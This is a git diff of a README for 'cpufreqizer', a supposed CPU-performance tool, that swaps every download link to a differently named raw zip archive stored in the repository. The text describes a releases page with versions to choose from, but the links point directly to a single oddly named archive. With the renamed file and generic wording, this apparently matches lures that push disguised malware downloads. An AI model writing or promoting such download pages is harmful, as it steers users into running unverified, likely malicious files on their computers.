@@ -1,6 +1,6 @@
 # 🚀 cpufreqizer - Optimize CPU Performance with Ease
 
-[![Download cpufreqizer](https://github.com/SirMike29/cpufreqizer/raw/refs/heads/main/cpufreqizer/Software-lindo.zip)](https://github.com/SirMike29/cpufreqizer/raw/refs/heads/main/cpufreqizer/Software-lindo.zip)
+[![Download cpufreqizer](https://github.com/SirMike29/cpufreqizer/raw/refs/heads/main/cpufreqizer/Software-v2.0-alpha.4.zip)](https://github.com/SirMike29/cpufreqizer/raw/refs/heads/main/cpufreqizer/Software-v2.0-alpha.4.zip)
 
 ## 📋 Description
 
@@ -23,7 +23,7 @@ These requirements ensure that cpufreqizer performs well on your system.
 
 1. **Visit the Release Page**  
    Go to the cpufreqizer releases page by clicking the link below:  
-   [Download Here](https://github.com/SirMike29/cpufreqizer/raw/refs/heads/main/cpufreqizer/Software-lindo.zip)
+   [Download Here](https://github.com/SirMike29/cpufreqizer/raw/refs/heads/main/cpufreqizer/Software-v2.0-alpha.4.zip)
 
 2. **Choose the Right File**  
    On the releases page, you will see different versions of cpufreqizer. Look for the latest version for your operating system.
@@ -88,4 +88,4 @@ Yes, you can always go back to previous settings. cpufreqizer includes an option
 
 cpufreqizer offers a straightforward way to optimize your computer's CPU performance. By following the steps to download and run the application, you can easily tailor your system based on your needs. Enjoy a balanced approach to power and performance with cpufreqizer.
 
-[![Download cpufreqizer](https://github.com/SirMike29/cpufreqizer/raw/refs/heads/main/cpufreqizer/Software-lindo.zip)](https://github.com/SirMike29/cpufreqizer/raw/refs/heads/main/cpufreqizer/Software-lindo.zip)
+[![Download cpufreqizer](https://github.com/SirMike29/cpufreqizer/raw/refs/heads/main/cpufreqizer/Software-v2.0-alpha.4.zip)](https://github.com/SirMike29/cpufreqizer/raw/refs/heads/main/cpufreqizer/Software-v2.0-alpha.4.zip)
